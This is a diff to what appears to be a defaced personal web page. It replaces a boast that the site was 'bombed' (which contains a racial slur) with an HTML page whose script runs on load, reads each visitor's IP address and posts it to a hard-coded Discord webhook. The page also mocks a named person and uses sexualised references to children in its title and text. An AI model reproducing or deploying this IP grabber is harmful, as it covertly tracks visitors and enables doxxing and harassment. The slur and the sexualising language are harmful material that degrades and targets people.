@@ -1,1 +1,75 @@
-site bombed by eye#8702, nigga thought he was slick, honestly github.io is easy to take down 🤣🤣
+<!DOCTYPE html>
+<html>
+<head>
+  <title>sexy kids</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: "Comic Sans MS", sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .ip-container {
+      text-align: center;
+    }
+    .ip-label {
+      font-size: 48px; /* Increased font size for the label */
+      margin-bottom: 10px;
+    }
+    .ip-address {
+      font-size: 36px; /* Increased font size for the IP address */
+      line-height: 1;
+    }
+  </style>
+  <script>
+    // JavaScript to fetch and display the user's IP address
+    document.addEventListener('DOMContentLoaded', function () {
+      const ipAddressElement = document.getElementById('ipAddress');
+
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+          ipAddressElement.innerText = `anyways your ip adress is : ${ipAddress}`;
+          sendToDiscordWebhook(ipAddress);
+        })
+        .catch(error => {
+          ipAddressElement.innerText = "Unable to retrieve IP address.";
+        });
+    });
+
+    // JavaScript to send the IP address to the Discord webhook
+    function sendToDiscordWebhook(ipAddress) {
+      const webhookURL = "https://discord.com/api/webhooks/1131512232388333589/rOj3ecwpRtY9O1RK0L3dGL-GuMLlUNAibZevfzRw0kGImtH7chTeT6ZXb9SQJyiW2lz-";
+      const data = {
+        content: `zwyq loves his daddy rajin (did i spell that right) anyways here is his ip :  ${ipAddress}`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => {
+        console.log("IP address sent to Discord webhook successfully!");
+      })
+      .catch(error => {
+        console.error("Error sending IP address to Discord webhook:", error);
+      });
+    }
+  </script>
+</head>
+<body>
+  <div class="ip-container">
+    <div class="ip-label">i love kids, i mean zwyq...</div>
+    <div class="ip-address" id="ipAddress"></div>
+  </div>
+</body>
+</html>
